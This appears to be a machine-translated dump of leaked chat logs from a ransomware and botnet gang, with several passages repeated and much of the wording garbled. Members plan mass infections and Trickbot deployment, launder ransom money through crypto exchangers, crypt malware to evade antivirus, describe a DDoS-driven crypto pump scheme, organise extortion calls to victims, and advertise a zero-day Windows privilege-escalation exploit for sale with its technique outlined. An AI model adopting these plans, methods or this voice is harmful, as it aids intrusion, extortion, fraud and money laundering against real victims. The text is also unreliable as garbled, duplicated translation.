I am looking for an alternative to making a profit if this continues to be the case - it will be necessary to look for another format of earning on the same theme that everything would remain the same in terms of interest
And yet soon will begin to send mass sms, based on the basis where there is a first name and card number (thankfully I have such a base)
Yesterday they changed the theme of the band where the operator leads customers to infect them (new theme subscription to AVs like mcafee) before there was a subscription on the type of Honey: Automatic Coupons, Promo Codes, and Deals (not a large refund for purchases) was more infections on it
but the AV wasn't very popular with the Americans for some reason.
I was wondering if i was a dumbass, i don't know what the fuck is going on...but i don't know what the fuck is going on...

and today we will be with Twin to infect 4k computers , tricks , because the government does not pay , we will take out the information and instead of locker we will upload to all machines in the network trickbot so that stafers can profit
About xerox , Ali says it is complicated , but the prospects are good
Tween refused to pay 6 cops who were already willing to pay
I am looking for an alternative to making a profit if this continues to be the case - it will be necessary to look for another format of earning on the same theme that everything would remain the same in terms of interest
And yet soon will begin to send mass sms, based on the basis where there is a first name and card number (thankfully I have such a base)
Yesterday they changed the theme of the band where the operator leads customers to infect them (new theme subscription to AVs like mcafee) before there was a subscription on the type of Honey: Automatic Coupons, Promo Codes, and Deals (not a large refund for purchases) was more infections on it
But the AV is not very good for the Americans for some reason.
so can you help me?
I do not understand what I have to do?
you give me the bit i give you the sber or what ?
re
Prvieth. Netwalker said that we renew the egels for him by subscription?

Hey, can you send the money to this address 1KfDPgc6CiWb6Fnin1bLWi2moX1ViXANxW ?
I'll try to find a way to send money to the lawyer by Wednesday, he started to rustle up some contacts for her relatives so far. 55 maybe even good, it will be easier to build a victim of circumstances...
Hey bro, the Spaniard wants to know the news and what's going on?
Hey bro, I don't know how it ended yesterday, I was out of town... I'm gonna ask you what happened again...
I don't know what to do.
You give me the bit, I give you the Sber, or what?
No, like last time... The guy has to pay with his card, and you pay me with Sber.
Hi bro, Spaniard wants to know what's new and what's going on?
Hi
privet bro
Privet bro!
The american guy is going to pay with bucks.

No. Like last time, the guy has to pay with his card. You pay me with Sber.
The American guy will pay in bucks.
In three transactions.
Hey, .
What is there to water?
Yeah
I only have bitcoin and that's it
Try it with a bk
you take bucks in bitcoins ... and withdraw the bitcoins in wood to me
Do you want a bitcoin cash?
fershtein?
here?
No
I understand that you need a ruble.
I'll use bestchange
I'll convert
And what will you transfer me?
How are things there
veron
)
When he's got something.
You'll get the bucks. I just need to set up payment references.
Remember 2 years ago we did the same thing?
I don't remember.
Yeah, there were bits and bobs.
A year ago. I looked it up.
I need to get some bucks from a guy.
Is there a way to pull this off?
yeah
no
I only have kosh bitcoin.
Or try mango.
he'll look at the exchangers
bestchange.ru
there's a bunch of different options
see for yourself
themselves are all reliable
I give a guarantee
on behalf of myself
I'll cover it if anything
> or try via mango
(20:09:26) admin: he will look at the exchangers

what kind of mango ? man ?
mango@
i don't have this person in contact .
he has mango@q3mcco35auwcstmt.onion ?
this jabber ?
No, he's not.
somehow not alphabetical) shows
Hey, quick question. I was told you could help me.
Stern says you can help me.)
Yeah. .
I need to take dollars from a foreigner and convert them into rubles to my account.
can i do it via you ?
reliable ?
will not bail ?
change reshaev@ the design of his locker
yt rby
reliable yes.
Okay, thanks. I already wrote him.
I guarantee he won't cheat up to $60,000.
What about your tasks? ) I haven't heard from you for a year or more.
> I guarantee he won't cheat up to $60,000.
You got a hell of a laundering operation going on over there.)
hello
what country?
Is the money clean or dirty?
Clean... from a client... USA
How much? I need 12500k in the U.S. right now)))
He needs to form 3 links... so he can pay them... and then to me also by small transactions
5500
What do you mean form 3 links? What payment?
I do not know what kind of payment ... he wants to pay through a visa ... I do not know how to accept it without a problem ...
Unless it's through a dropper.
But they will want a commission of 20% or 30%.
I haven't done that in a long time.
That's not an option.
30's a fuckin' lot.)
Let him send 12500 and I'll give you the bits.)
I need 12500 too in the yus just the same...
I don't need no bits. You can't put 'em on bread.
We'll send you the money on the card through the money changer)
yes ... What about the 30% commission?
You have a roux card? I have money changers who will put it on the roux card, but I need to pay 12.5K to a US lawyer, can't your guy there help us out?
and we'll send him the bitcoins if we need them or you, whatever you want to do)
I can send it to your card.
He can send it to the right place ... but I do not know how to do it ... I don't have 12k.)
I don't have that kind of debt yet.
You're not in the U.S.?
i got it) then it will be different operations, i am busy looking for someone to exchange the money from us to btz
I'm not.)
If I find the guys, I'll let you know if they'll do the same for you.
The main thing is that there's no scam
Can't you set up a link for payment... so he can just pay... and you can get the BTS?
No bro, I haven't seen it that way.
It's hard to get money into the U.S.
Then my guy can pay the money to someone else... by direct transfer. The main thing is that it's clear that my guy paid and your guy accepted.
Ask him if he may need some bits, I'd send him 12.5)
I do not understand) if he needs the bits ... what does it have to do with your 12.5k? ) it's not bits
and you mean bits for 12.5k?
let's deal with my 5,500 first ? what do i tell him ?
yeah
tell him it's not 5,500, it's 1,500))))
he won't understand )
and we'll compensate him with the bit left over
and we'll send it to your card.
Then wait a couple of days.
Ok. But I'll text him.
I'll find a U.S. guy who'll take it - I'll ask you if you want it.
Do you want it?
Can you hold it till Wednesday?
I am still patient ... the man owes me a year and a half. my current service for him below the plinth .
I wrote him:
i have one solution about $5500 payment. I have man who should pay $ 12500 to some lawer from USA. So it could be an offsetting.
Also if you need bitcoins, this man can pay you bitcoins and you pay to this lawer the rest of amount. What do you think ? Does it works for you ?
Is it working for you ?
Yeah, it's OK.
Okay, I'm waiting for a reaction from you and him too.
but the last I heard from him, he's not interested in beats... maybe things have changed now.

Znaniu webinjektom with the ability to modify the code of the page. In the testing phase, but I would already be implementing it.
Working on a container to deliver load, made a builder to make it easier to assemble the container
Acquired Ciska looking for potential holes in it
the reverse engineer is still on the phone at the post office now doing the specs
elvira@q3mcco35auwcstmt.onion is the new helper.
Hi. Support for documents with macros, loader, admin for the loader. Tasks are clearing detects.
Hi. All good. I am in the process of setting up servers. At this stage I am setting up a virtualization server for Mac OS.
I've been dealing with Booza's request
Yeah
I need more C++ people and reverbs for swift
That is, perhaps, all my current tasks. :)
hi
what's the task
Ok, got it.
It would be more organized, but because of the peculiarities of prodokshin I think it is not realistic. :)
hello
you can clean it?
Does anybody use your dock?
I want to use rtf to add load.
It's working so far

What about pupy?
Hi
how's it going
Are you able to make bots?
I just got on the defender team and was assigned this task.
Launched, looked, in general works. But everything is very unstable, the bot does not always reach, many modules do not work at all, just dumping root dumps. No webkit. Just like that, it's not real to start using it.
Hi. I make bootloader/bot builds every day. I clean them periodically. Periodically improving/changing them. When I'm not doing BC, I'm refining my crypt so it can be used on the server for automated builds.
Hi. I'm doing fine. I was assigned to Twin in Team_C. We're about to jump into a new grid.
Able to generate bots for different platforms, tied linux, android. Only looked at under Win
Hello, all is hot, locale is the last 2 large cases are waiting for bidding ...  Well, the work also have more cases, in passing trying to train newcomers in the team, the tasks have added their team will watch the trainings and other related things to do ... the issuance of servers novenkim and etc ... it is like all can not describe at once)) all is good moving forward
Business - good. Interesting and busy.
All of the cryptors switched from manual to automatic builds through build machine.
Now they are busy updating and cleaning stubs. And I make files on the build machine, check and issue. If something builds dirty, I go to
to the cryptor. He cleans the stub. Check it again and give it away.  
Tasks:
1. Crypting files for Leo on the build machine.
2. silk code cobalt.
3. lockers.
4. Coabalt eche and dll
5. dll trike
6. Teach and give other team members access to the build machine so they can build their own crypts.
7. Preparing links for load and testing echelles for netwalker, hash, cherry.
I've been waiting for a long time for a dedicated dedicated server with msf.
Hi. Things are fine.
Sorting out cryptobirch, protocols, api, etc.
Crypto exchange development task.
On vntz I'm dealing with a module crash bug when trying to decrypt passwords.
Hello, I work, it seems all the basic stuff goes well, I learned a lot here, and I learn... guys always show me something new, in general, everything works out
Hi, I am moving slowly.
I work with bot admins and know how to set them up, so far I have set up import and black.
I'm currently sorting out the supervisor and documenting it.
The task is to set up a test server and make a ngtwork column from one odomain to another
Generally there is a tasklist, there is a lot of stuff there.
The task is to make kind of stats on the data which came and where they went
network
And so everything is great everything is provided, :) thank you.
Hi how are you doing?
Hi! I am working on the fine tuning of the bot and the loafer. There is x64 version, which works, it has 1 detector on the non-main AB. There is the x86 version, which has more detects of AB, it needs to be cleaned. Now I am adding proto2 to bot and loader. The next task is just cleaning up the x86 version from detects. Before that I developed the looder in dll format for rundll32. There were some difficulties, but they have been resolved. The dll-loader works both on its own and as part of crypts
hi
how are things
how's it going with your uk?
does anybody use them?
Hey, how are you doing?
Kaktus is in charge of this. I do not know who to give what BC.
In general, to be honest, I would like to write, glad to work with you, the first place where I get pleasure)) thanks for the opportunity bro
I would have to check with him.

Hi. looking for me?
Hi!
I develop BC, give out builds on demand. There are a few tasks, which are mostly about changing the functionality of the BC.
As for improvements, I think it's far away, but there are ideas, I will describe them

Hi
I tried Elon's mailbot, it turned out that uploading it through bots is not an option. As Elon himself says there are some nuances and the upload fails for some reason. Elon is preparing a new module or something like that, to make mylebots upload through bots)
The last message I asked elon about redoing the module was the answer:
elon@q3mcco35auwcstmt.onion: Greetings. It's done, it's in testing.

Hi, it's good.
I apologize for not answering at once, it's been a long time since I communicated via toadstool, I didn't see what you wrote.
I'm just finishing a full report on the Intel ME controller mechanism and the AMT technology based on it.
Restored a bunch of undocumented commands by reversing, dumping the interaction interface and phasing.
Unfortunately the initial theory based on the presentation of Embedi/PositiveTechnologies reservers is not confirmed as they presented it, but there is another legal mechanism to activate AMT, but until the working POC was not reached, at the moment I am doing sniffer buffer which provides HECI interface, as it all configured in UEFI it took a little longer, after I fully restore the command set, the POC will be prepared.
Ideas are there, on the subject of uefi it's not just a load dropper but probably some SMM level handler daemon, plus since I'm studying the ME controller intimately now, there are ideas to test such functionality as overwriting a SPI stick through it. Usually this controller is allowed to write to the stick what you can't say about the processor, and some commands were found which are responsible for this functionality.

Hi!
Crypting, as usual. My testers say it works.
I spent few days for connecting my stub to build-machine.
I have not got any global ideas yet ))). And the little things I have to think about every day, - crypting is hard work,
as it turns out.
I've been working here for two years now. June 14 is my first two week vacation.
hi
I didn't work out with norbert, so I got fined.
I'm back on the crypto, I'll be done soon.
we can improve the encryption algorithm

ok, no cp
We sent you the terms of reference for the filter.
not ready yet?
Hi. i don't remember anything about the terms of reference. when?
A long time ago.
I don't know.
probably forgot ... Remind me again?
In the admin room are knocking strange bots,
 need to add a filter to filter out such bots, do not give them configs (commands 23, 5) and
 commands to launch modules and files (commands 42, 43, 44, 45, 46, 47, 48, 50, 62):
 1) by ip (you can specify specific ip, or a whole range)
 2) by id:
  Kevin_W617601* - all bots whose id starts with Kevin_W617601
  *Kevin* - all bots, which have Kevin in their id
  you can specify a list of such filters
 3) by Version:
 	 Version < 1080
 	 Version == 1027
 	 Version != 1089
 	 Version > 1099
 4) by Group:
 	aver*
 5) by System:
 	Microsoft Windows 10 Pro
	Microsoft Windows 7 Professional
	Microsoft*
	*Microsoft
 These filters can be grouped, for example:
  Version < 1080
  System: *Microsoft
	etc.
is this about lero?
probably
I think there are some filters there.
Okay, I'll check with the admin.
Def's is better.
Yeah, he's got

Who has any ideas about blockchain and cryptocurrencies, where to go and what to develop. Who thinks they are gurus in crypto trends?
I was busy yesterday, I fancied some cool functions, like a personal file storage with possibility to share some files, closed clubs of interests, joining which would be checked by voting, open public groups for general discussion... System of user reputation to eradicate cheaters and meddlers and leave only really working guys... This also a bunch of services can be screwed, like grandmothers did last week, when they allowed to put the date to all comers hackers to their resources, even if they are not related to their locker - anyone can there any date to store ...

This is under this social network you can implement all your erotic fantasies in one place, and the exchange, and the file dump in the blockchain...
The amount of work is gigantic, without experience in administration we can't do it ourselves, I think it's necessary to attract some colleagues like hss... this will be the evolution of our underground into something more serious...

You Uncle think about it all plz, the topic is interesting, but very difficult... Let's be realistic, we own the whole omnibus of work is not enough people or experience is not enough, so the cooperation with the administrators of at least similar sites will be a very bold plus to us...
[Error: the message is encrypted and can not be decrypted.]
[Error: message encrypted and cannot be decrypted...]
How do you use these filters? I just figured out the ip.
Will it work ?
it's like that, but how to deal with it
what is not clear there ?
my client ate some characters
The rep has a full description of it.
can i have some examples of the following
1) by ip (you can specify a specific ip, or the whole range)
2) by id:
 Kevin_W617601* - all bots whose id starts with Kevin_W617601
 *Kevin* - all bots, which have Kevin in their id
 you can specify a list of such filters
3) by Version:
       Version < 1080
       Version == 1027
       Version != 1089
       Version > 1099
4) by Group:
      aver*
5) by System:
      Microsoft Windows 10 Pro
      Microsoft Windows 7 Professional
      Microsoft*
      #Microsoft
#{
  <<"x">> => 1,
  <<"y">> >> <<"hello">>,
  <<"ip">> { ip, <<"162.76.2.1">> },
  <<"true">>
}
then:

* 1 > 2 -> false
* x =< 2 -> true
* 1 ++ 2 = 12 -> true
* x ++ 2 = 12 -> true
* x ++ 2 = 2 ++ x -> false
* x ++ 1 = 1 ++ x -> true
* y = "*lo" -> true
* y = "*lo*" -> true
* y = "lo*" -> true
* !(x>1)&y=\"hello\" -> true
* y =& [ "*lo", "hel*"] -> true
* y =|[ \"lo*\", \"(hel*\"] -> false
* ip ~ \"162.76.0.0/16\" -> true
* ip !~ \"161.76.0.0/16\" -> true
here are all examples
That is, each client is some kind of properties ... see above ...
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop ... What are some of the ideas?
still don't get it.
If one of the rules is false the client is discarded.
Read it first.
What don't you understand?) ?
Please do some examples of the terms of reference
for example Kevin_W617601* - all bots, whose id starts with Kevin_W617601
how to write it in your version?
id != "Kevin_W617601*"
<<"true">> => true,
<<"false">> => false,
<<"id">> => client#client.client_id,
<<"client_ver">> => Client#client.client_ver,
<<"name">> => Client#client.name,
<<"group">> => Client#client.group,
<<"ip">> => Client#client.ip_parsed,
<<"country">> => Client#client.country,
<<"sys_ver">> => Client#client.sys_ver,
<<"importance">> => Client#client.importance,
<<"userdefined">> => Client#client.userdefined

here are the available column identifiers
so you have to write <<"id">> != "Kevin_W617601*"
?
why <<"id">> ?
it's from the source ... just write "id">> "= " ... "
## Available identifiers

The following client field identifiers are currently supported and can be inserted in the expression code:

* ``True'' is always TRUE
* ``false`` - always False
* ``ip`` - special IP type, you can match it with ~
* ``id`` - client id as text
* ``client_ver`` - client version
* ``name``` - client name (string)
* ``group`` - client group (string)
* ``ip`` - The ip of the client which was sent by the /0/ command
* ``country`` ``country of the client (string)
* ```sys_ver`` - system version (string)
* ``importance`` - number
* ``userdefined`` - number
Okay, now it seems to make sense

Didn't specialize in blockchain, although interesting. There is a hobby in studying Pampa/dump/listing processes and the soaring value of coins on the Binance crypto exchange. On the horizon is the use of an automated bot in these processes.

He understands what I'm suggesting.
good
he has the same topic for other countries
you can tell he's a pro.
and that dick won't get anything
because of his greed and mistrust.
He said about you so you could work, but they already get 250k
That's what I said.
If you'd negotiated more, he'd have agreed
that's the most they'll go for.
Professor's off the grid.
I told his people you were looking for him.
the thing about the negotiator is that he immediately says the maximum amount the company told him

Hi, what do you do here?
Hi. In a nutshell.

Find young forks on exchanges (those that can be mined), analyze their infrastructure. Where servers, nodes, capitalization.
Find a place where crypto holders communicate (discord, etc.).
Find out the IP of the nodes. Most likely to be IPv6. Begin to crack. Hop into chat room, found earlier and write that there is a problem, crypto is not displayed, operations are not conducted. (since crypto depends on mining, there will really be problems).
Holders get nervous and withdraw the main balance. Crypto drops in value. We buy at a low price. We let go of the ddos. Crypt goes up again. We come out in the black. Or the option of writing to the creators about the possibility of a buyback if they want the ddos to end. With the main problematic points being the implementation of Ipv6 ddos.
good idea
how to know ip - node ?
[Error: message is encrypted and cannot be decrypted.]
yes
got
But I don't get it.
we have a target of 10 reverses to have a lab.
How's the manhunt going? Is it difficult?
at least by the end of the year to gather
and distribute the tasks and get the results
if we need to buy iron.
[Error: the message is encrypted and cannot be deciphered.]
[Error: the message is encrypted and cannot be decrypted.]
wrote 2 test messages
Find cold wallets, especially big holders, and watch what ip they connect to (roughly speaking, do reverse, these ip and will be nodes).
i have something stopped switching encryption
Did you see the message?
and i sent you a new public key
yes, i put it in.
1 test I see
Ah, there you go.
So it's working.
[Error: message encrypted and cannot be decrypted.]
but how do I turn the encryption toggle button back on?
Look for the button on the right.
[16:04:38] <HOF_tsesar> here's another encrypted
not OTR
[Error: message is encrypted and cannot be decrypted.]
I can see the button, but it is deactivated
1 2 3
i.e. you can't enable encryption
and before you could.
and you attached this new key to your account?
and now you've already reloaded it three times and nothing
I created it there.
Wait a minute
you created it in the plugin
Now select accounts.
there select the toad's account
click edit
and on the second tab select the key

Since the FBI so actively prohibits us to pay and flaunts it in all possible channels - can the release of some kind of response? like an interview, where to give some laugh and describe the situation, to say that so-and-so, but if the tolerant appeal to the FBI - they just go away with their files and they themselves this is not good... conduct a so called propaganda work... what do you think about this?

Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... Who has any ideas?
Hi
Good afternoon. There is a 0-day privilege escalation exploit for Use-after-Free vulnerability in WIDFRD.sys driver. The exploit is implemented for Windows 10 x64 1607, 1703, 1709, 1803, 1809, 1903, 1909. It is present in 2004 and later, but the corresponding code in the driver was rewritten, and OS crashes in BSOD before the target vulnerability is triggered on null pointer dereferencing. There are some nuances on exploitation: not all systems may be vulnerable, as there is a dependency on hardware configuration. Exploitation takes place by disabling SMEP (CR4 modification), modifying PTE/PML4 if necessary, and executing code that performs token replacement of the target process with the system one. I publish the announcement here, because my regular customers do not need / do not fit, and in the personal from those who on the forum expressed a desire to buy, no one answers. The price of 60k, negotiable. Willing I can write and issue a utility, which when run on the system of interest will tell if the OS is vulnerable or not. The first contact in the PM, then in jabber.


I'll add:

The exploit is for sale in one hand.

Video of the work:

https://filetransfer.io/data-package/ctyCDTW6#link

Password bvdiviy2861rVJVl

 

What happens in the video:

1. The wud.exe process is launched, exploiting the vulnerability.

2. wud.exe creates a cmd.exe process and pauses for 5 seconds to check privileges.

3. I run notepad.exe (instance 1) from the created console.

4. After a while I check my privileges and run notepad.exe (instance 2).

5. In Process Explorer I check the level of cmd.exe and 2 instances of notepad.exe one by one. I can see that copy 1 is running with medium IL, and copy 2 (when cmd.exe's permissions were already elevated) with SYSTEM.
All in all, it's not so bad. The bots are going, 4 nets took the chors yesterday :)
Good morning. Waiting for the crypt files.
Good morning. Do we do the echelle?
Good morning, bro. Doing ehel today?

Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... Who has any ideas?
Hi!
So far we're getting to grips with the withdrawal of AD, ballooning, etc.
Got to the rasping
figured out the sonic.
I can't tell if I've improved anything in particular yet,
But, as I've learned for myself, it's very important for a beginner to consistently dive into the material:
I grabbed every case study I was called to look at at first, then older comrades advised me to deal with it one by one...
Draft it when you're online.
Afternoon. Doing today ehel?
I have a job for you. Knock on Bentley, get the cypted file from him and take it all the time, a file of uk and tric

Hi
What are you doing?
Hey, how's it going with the locker?
Hi.
I dropped off the multipot. Got the new requirements for coding large files.
We'll finish it today or tomorrow.
Unexpectedly ran into a problem with working out AB on VSS.
Deciding right now. I'm busy with that.
Hi. Please clarify what to test terry in the BC?
I will decide today.
I hope so.
Oh, buddy, we keep getting new requirements. :-)
And so, it works perfectly.
Without VSS, it was ready to go to work yesterday!
hello
It's supposed to upload a crypto file to the web somewhere
and then download it from different machines with the chrome browser
and run it.
to make it work and knock.
Got it. I'll set it up.
Hi, how are you doing with the lockers?
Any requirements for the protocol, architecture, modes, additional requirements?
Dude, we built our own engine. It works great. AV is nothing. But, as soon as you try to manipulate VSS, it burns.
It's understandable. It's the mechanism against us.
Let's do it.
The main thing is to download from chrome
directly to the .exe file
so it doesn't get blocked.
I see. It's just that there is also a question of the host from where it is downloaded. There may also be some nuances.
Are there any complaints?
Crashes are an isolated incident.
Our task is clear.

They don't have ICU or anything like that.
They mostly treat sports injuries.
They're insured for 3 grand.

what's up
hi.
There was a problem with the sia daemon hanging up. That is, it started up, and after a while it stops responding to RPC http requests. I think it was fixed by completely removing all files and renter data (contracts and other data). I recreated them, seems to be no longer hangs. I also need to fix the backup script, so that if I try to upload backup data to the server it would try to do it again.
In general, it is not very reliable yet. I had an idea to make two backup servers, so that one would be a backup and if I needed to erase everything I could restore from the second one.
So far, even the developers themselves believe that Sia is not suitable as the only place for backups.
I still have three servers in test mode on Sia.
I don't know what to do with Sia yet but I'll have it tomorrow.
can you provide security report while data is still uploading.

Hi
Okay, I'll check it out.
They're slow and unstable.
All of them?
I can upload them for you to test.
Some are not at all, some are more or less.
but they used to be faster.
They're supposed to be faster.
Okay, let's see.

Sorry I got caught up.
Hi
Okay. .
How's it going with you?
Got in touch with golden yesterday.
I'll send him the crypto today.

hi.
There was a problem with the sia daemon hanging up. That is, it started, and after a while it stops responding to RPC http requests. I think it was fixed by completely deleting all the files and renter data (contracts and other data). I recreated them, seems to be no longer hangs. I also need to fix the backup script, so that if I try to upload backup data to the server it would try to do it again.
In general, it is not very reliable yet. I had an idea to make two backup servers, so that one would be a backup and if I needed to erase everything I could restore from the second one.
So far, even the developers themselves believe that Sia is not suitable as the only place for backups.
I still have three servers in test mode on Sia.

i need the rest of the money for the carbon the other day, i think they should send it over tomorrow...

They -- I mean, the developers? The Skynet theme is being actively promoted right now. Developers are concentrating on it now. Network capacity is growing little by little -- about 3000 terabytes of free space available now, of which about 900 is used.
Run some private messages, it's weird how Psi+ crashes with the new fingerprint. Just checking.
So, things are developing little by little. Although in some places, technology is still raw. There is a possibility of data loss. But in my opinion, among similar technologies, the developers of Sia are the most advanced. And the system requirements are the lowest among competitors.
Adam asked me about it today -- I think he can tell you what he said.

I'll finish the builder today and give it to you, I can't give it to you like this.
You do not have a large grid there?
It's desirable to test it in battle and not to put a big one at once.
It's a big one.
I'm almost done with it now.

Hi. Tom-y wrote off the files to check the three sent. There are nuances. When you start the smartscreen window pops up with a request to confirm the launch of an unknown eche. Plus Chrome still does not give a direct link to download the exe (eg site.net/file.exe).  From third-party exchangers download, tom checked. Well, he himself otpishete, I think. This links for today: privnote.com/qnWwYXQQ#3TLtk0rXt
2+2+3=?
At the expense of smartscreen with a warning so far, the opinion is that he will still pop up when you run the eche directly downloaded

Yes, I have already discussed maybe not an exe but some js file or something else.

I need some ideas and full understanding.
bro come on
give me wisdom
come on
what's there
there)
In general, the situation is this. about the salary for the team prof. Whom we bring him - I or Virep - they pay the salary we. Who they find themselves - they pay themselves. There starts the bullshit that they themselves do not understand who they pay who do not ... I wrote to Prof. Maybe you and C clarify who ends up paying who, etc.. He said ok and silence. Just in all our chats have people who pay us and the prof, even the reverses. I propose that there was no confusion and no one there accidentally by 2 times did not stick (was last time a couple of attempts, but I prieketsya))) - We need to decide Either I pay everyone the salary, or let the chat with pentesters where prof - they themselves pay everyone.

hello yes
ok
I'll talk to Reverse today.
I need a list of people.
All of them or just reversa?
We have a smaller concept of data analysis and call blackmail. I've put it to Booze:

We have a separate rocket for intelligence. there is a group on requests - there hackers ask to pressure or prepare this or that company. we pass it on to analysts, they make a report-dossier. if blackmail/calls are required - we pass this task to callers. So that the callers work efficiently and don't call up into the air like they do now - they are in touch with analysts and can ask them for any additional data
like a portion of the date listing, or some info on the computers/passwords.
If the company does not go into contact - its data is passed on, for publication on the site. (for this you need to pull up either the solver or some of his support team in this chat)

The essence of the problem with calls is that more often than not, when you call the reception, you get to some lady who does not know the situation. and in fact we just you out of nowhere with such a call, you need some kind of proof that there was a result, and not just hang up or send the caller.

Basically everything already works, we just need to fine-tune it and let the hackers start using it. I pulled up there gang dereke, hors, still pull up revers...
Today I'll prepare the actual lists of salaries and amounts, but it would be good if today you decided everything on the people of reversa
and i need money back too, both for salaries and carbon) and bonuses and bonuses
enough for sq8)))
I need two more days on the social network and i need to roll out my thoughts, my imagination ran wild while i was thinking about it all over the weekend with chivas, i'll formulate everything and write out a plan tonight. so far i'm loaded to my wits' end...
Hey. Any ideological leaders? Have you chosen a language? I looked up blockchain building, there are a lot of options in basic languages c++,c#, python, golang, javascript etc.

by the way, is tunry out of commission? he's been gone for a while
Hey ok
Hey, is there 50k for the reverser?
For the test mission.
Hi. Yeah. He did the job with a bang. But I can't get him on staff.
Why ?
I don't know what's wrong with him.
Okay, should I give the browser to Zeus and him?
He's a little slow on the uptake. He's lacking experience and imagination.
not yet.
they don't ask him.
ok
maybe in a couple of months he'll learn and write.
but is there a point?

Repeat it, please. It's all cut up.
On the Prof - I talked to him, he said that you yourself decide everything and tell me what to do, neither from you nor from him in the end did not have any information...

Bro if you can please pay a little more attention - I'm trying to work on all your wants, and you read through a line like everything... Even now I threw you this type of git@ I wrote that he has a development on the social network, on bitcoin mixer, and you with him for the blockchain in the end talked. I understand that the social network will be on the blockchain, but the development of the social network also needs coders - so he has them. And what about the blockchain part - for it we will look for other people... so you ended up talking to him for the wrong reasons, or I do not understand something wrong in the tasks that you set

I fuck around here day and night on all fronts that you put, I want you to be there all the time, I constantly show initiative, but you end up answering once a day at best.

And as for pulling someone close - well, yes pulled, through the brother found the right people to solve your problem. No one will do that for you online. And offline, I do not think that you'll find the same badass guys who agree to risk a normal white firm with a hefty turnover and reputation, and even more than one in the end... To buy this carbon was a matter of principle already, and I could not find any other options with whom it could be done, and no one else would have found it, this is not a coke on the hydra to buy there own security service works like in the white house. It was just such a fucking difficult task, and in the end we got it done, we bought it. I also promised the guys that I would give them chicks and a sauna, because it was really not that easy. The same thing about Alka - you set the task to solve her problem. I'm working my butt off to solve it, thanks to the fact that I have good opportunities in this area - but then again, it's all offline, through a trusted person in whom I am 100% sure. And I understand my personal risks as well. But I'm doing your request as for me. In general, all these very extravagant quests you try to solve. I worry about the results of the whole team as for my own. I get upset when negative things come flying at you and try to fix it all, fix it all up. I save your money as my own, demand reports from all, bargain with all, collect sanctions if anyone has them... For all financial matters, everything is always clear and a few times I write you back, that where and how much was spent, why and why. But I have a clear feeling that you are not interested in this at all. I am not a psychic. I can't think for you about your cunning plan and all your desires. Then write down your tasks more precisely. I wrote about off-line, that I'll do through friends - all the time I wrote it. You didn't say a word. And now you say that you can not. We also talked about the budget of all these moves more than once - you wrote that OK, 50 60k is fine for you... And then it turns out that you don't even need it anymore.  I wrote that we have people who we have not considered before - I know that you do not have time for this, I decide myself with them so as not to bother you and not to ask for another 3-5k, you all write off and describe, where and what was spent - and you do not even remember about it.
You constantly make me think that you're not interested in what's going on here, that no matter how hard I try for you, I bring results - and you do not remember after 2 days about it ... "Later, tomorrow, yes, OK" It's all a trifle to you, but I've lived my whole life here while I've organized and arranged all this. I'll be gray in a year.

The email services you asked for.

The tuta.io - it is the same tutanota mail registers tor, but also for activation of mail up to 48 hours are necessary, mass reguire mail so stop. So the option is normal, but it is necessary to register an account just for 2 days and everything will be clear

protonmail.com - asks for another email to register, but does not require confirmation! a normal option for your needs

nibblefish.net - all clear and without unnecessary questions, there are options web mail and pop3smtp, also a normal option

inbox.lv - sometimes it is slow through tor, but with a normal browser + vpn registers without problems

mail.rambler.ru - all clearly registered, if not confused that it ru (which is probably in fact even +)
still need ideas and a full understanding

hi
I mean, how to make your own blockchain?
That's a deep code to dig into.
Or do I need to raise Ethereum blockchain server and add to it some engine for wallet, exchange, and exchanger? I.e. do I need to raise some kind of infrastructure on one of the three blockchains listed above, or do I need to make a fork of one of them and sharpen it for myself? That is, what exactly is needed, and what should be part of this infrastructure?
Honestly, I have no idea about NFT, DEFI, DEX and how they differ. I know only about some types of tokens. I've only been on the blockchain topic for the last 2 years. I'm afraid that in a week I'll only understand very superficially.

On the Prof - I talked to him, he said that you yourself decide everything and tell me what to do, neither from you nor from him in the end did not have any information...

Bro if you can please pay a little more attention - I'm trying to work on all your wants, and you read through a line like everything... Even now I threw you this type of git@ I wrote that he has a development on the social network, on bitcoin mixer, and you with him for the blockchain in the end talked. I understand that the social network will be on the blockchain, but the development of the social network also needs coders - so he has them. And what about the blockchain part - for it we will look for other people... so you ended up talking to him for the wrong reasons, or I do not understand something wrong in the tasks that you set

I fuck around here day and night on all fronts that you put, I want you to be there all the time, I constantly show initiative, but you end up answering once a day at best.

And as for pulling someone close - well, yes pulled, through the brother found the right people to solve your problem. No one will do that for you online. And offline, I do not think that you'll find the same badass guys who agree to risk a normal white firm with a hefty turnover and reputation, and even more than one in the end... To buy this carbon was a matter of principle already, and I could not find any other options with whom it could be done, and no one else would have found it, this is not a coke on the hydra to buy there own security service works like in the white house. It was just such a fucking difficult task, and in the end we got it done, we bought it. I also promised the guys that I would give them chicks and a sauna, because it was really not that easy. The same thing about Alka - you set the task to solve her problem. I'm working my butt off to solve it, thanks to the fact that I have good opportunities in this area - but then again, it's all offline, through a trusted person in whom I am 100% sure. And I understand my personal risks as well. But I'm doing your request as for me. In general, all these very extravagant quests you try to solve. I worry about the results of the whole team as for my own. I get upset when negative things come flying at you and try to fix it all, fix it all up. I save your money as my own, I demand reports from everyone, bargain with everyone, collect sanctions if anyone has them... For all financial matters, everything is always clear and a few times I write you back, that where and how much was spent, why and why. But I have a clear feeling that you are not interested in this at all. I am not a psychic. I can't think for you about your cunning plan and all your desires.

he agreed to work with us, we paid him for a week, he did a few files in a week and then we sent him to the morse that he will do his doc. They tried to do it but they didn't make a good file. And then he said he wouldn't work with us for a while and that he had some projects of his own.
The strange thing is he didn't work with us but he was in toadstools when he got your blockchain mailing list...

I'm in the chat room.
I have a trick bot.
I don't care if you're a tenner and you weren't even that good.
I'm happy with the trick bot.
Yeah, well, the stun was pretty bad at 10 anyway.

Hi
Do plz test decrypt files in acesurgical.com
Bro people are waiting for the WP... it's already uncomfortable to write the same thing 5 times, but you leave me no choice
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. That on our system, others have already created their own coins, exchanges and projects.

i copied the wrong one. the new admins were just writing a minitka.
Who has ideas on blockchain? and cryptocurrencies, where to go and what to develop. Who considers themselves gurus in crypto trends?
1) we want to create our own crypto system along the lines of:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

